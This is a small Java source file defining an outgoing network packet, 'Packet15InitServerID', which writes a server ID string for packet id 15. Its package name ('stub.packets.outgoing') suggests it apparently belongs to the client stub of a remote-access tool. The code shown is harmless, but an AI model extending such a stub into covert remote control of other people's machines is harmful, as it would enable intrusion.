package com.redpois0n.stub.packets.outgoing;

import java.io.DataOutputStream;

import com.redpois0n.common.io.StringWriter;

public class Packet15InitServerID extends AbstractOutgoingPacket {
	
	private String id;
	
	public Packet15InitServerID(String id) {
		this.id = id;
	}

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		sw.writeLine(id);
	}

	@Override
	public byte getPacketId() {
		return (byte) 15;
	}
}